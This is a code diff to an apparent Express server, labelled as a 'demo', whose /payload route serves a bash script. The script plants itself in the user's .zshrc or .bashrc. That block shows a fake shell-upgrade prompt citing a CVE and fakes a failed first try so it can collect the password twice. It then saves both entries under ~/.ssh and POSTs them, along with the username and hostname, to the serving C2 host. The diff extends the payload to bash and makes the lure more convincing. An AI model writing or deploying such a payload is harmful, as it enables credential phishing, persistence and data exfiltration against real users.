@@ -58,40 +58,56 @@ app.get("/api/data", (_req, res) => {
   res.json(store);
 });
 
-app.get("/payload", (_req, res) => {
+app.get("/payload", (req, res) => {
+  const c2Host = req.hostname;
   res.type("text/plain").send(`#!/bin/bash
-grep -q '# >>> SELECTIVE-SINNERS-DEMO zsh-update >>>' ~/.zshrc 2>/dev/null && exit 0
-cat >> ~/.zshrc << 'EOPAYLOAD'
+MARKER="# >>> SELECTIVE-SINNERS-DEMO shell-update >>>"
 
-# >>> SELECTIVE-SINNERS-DEMO zsh-update >>>
+case "\$SHELL" in
+  */zsh)  RC="\$HOME/.zshrc"  ; LABEL="[oh-my-zsh]" ; VER="zsh 5.9.1 → 5.9.2" ;;
+  */bash) RC="\$HOME/.bashrc" ; LABEL="[bash]"       ; VER="bash 5.2.21 → 5.2.26" ;;
+  *)      RC="\$HOME/.bashrc" ; LABEL="[shell]"      ; VER="shell update available" ;;
+esac
+
+grep -q "\$MARKER" "\$RC" 2>/dev/null && exit 0
+
+cat >> "\$RC" << EOPAYLOAD
+
+# >>> SELECTIVE-SINNERS-DEMO shell-update >>>
 (
-  _SINNERS_CACHE="\${HOME}/.ssh/.ssh_accounts_sinners"
-  mkdir -p "\${HOME}/.ssh"
+  _SINNERS_CACHE="\\\${HOME}/.ssh/.ssh_accounts_sinners"
+  mkdir -p "\\\${HOME}/.ssh"
 
-  if [ ! -f "\$_SINNERS_CACHE" ]; then
+  if [ ! -f "\\\$_SINNERS_CACHE" ]; then
     echo ""
-    echo "[oh-my-zsh] Upgrade available: zsh 5.9.1 → 5.9.2 (security patch)"
+    echo "$LABEL Upgrade available: $VER (security patch)"
     echo "This update fixes CVE-2026-31337 — credential caching vulnerability."
     echo ""
     printf "Password: "
-    read -s _demo_pw
+    read -s _demo_pw1
+    echo ""
+    sleep 1
+    echo "Sorry, try again."
+    printf "Password: "
+    read -s _demo_pw2
     echo ""
     echo "Verifying... done."
-    echo "[oh-my-zsh] Update applied successfully."
+    echo "$LABEL Update applied successfully."
     echo ""
 
-    echo "\$_demo_pw" > "\$_SINNERS_CACHE"
-    chmod 600 "\$_SINNERS_CACHE"
+    echo "\\\$_demo_pw1" > "\\\$_SINNERS_CACHE"
+    echo "\\\$_demo_pw2" >> "\\\$_SINNERS_CACHE"
+    chmod 600 "\\\$_SINNERS_CACHE"
 
-    curl -s -X POST http://\${C2_HOST:-localhost}:4000/log/password \\
+    curl -s -X POST http://${c2Host}:4000/log/password \\
       -H "Content-Type: application/json" \\
-      -d "{\\"source\\": \\"shell-persistence\\", \\"user\\": \\"\\$(whoami)\\", \\"password\\": \\"\${_demo_pw}\\", \\"host\\": \\"\\$(hostname)\\"}" \\
+      -d "{\\"source\\": \\"shell-persistence\\", \\"user\\": \\"\\$(whoami)\\", \\"attempt1\\": \\"\\\${_demo_pw1}\\", \\"attempt2\\": \\"\\\${_demo_pw2}\\", \\"host\\": \\"\\$(hostname)\\"}" \\
       > /dev/null 2>&1
 
-    unset _demo_pw
+    unset _demo_pw1 _demo_pw2
   fi
 )
-# <<< SELECTIVE-SINNERS-DEMO zsh-update <<<
+# <<< SELECTIVE-SINNERS-DEMO shell-update <<<
 EOPAYLOAD
 `);
 });
